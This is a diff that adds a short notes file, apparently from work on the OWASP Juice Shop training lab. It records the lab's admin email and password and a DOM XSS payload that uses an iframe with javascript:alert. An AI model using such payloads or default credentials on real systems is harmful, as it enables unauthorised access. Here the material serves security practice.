@@ -1,0 +1,8 @@
+admin email > admin@juice-sh.op > admin123
+
+
+DOM xss : <iframe src="javascript:alert(`xss`)"> 
+
+
+
+
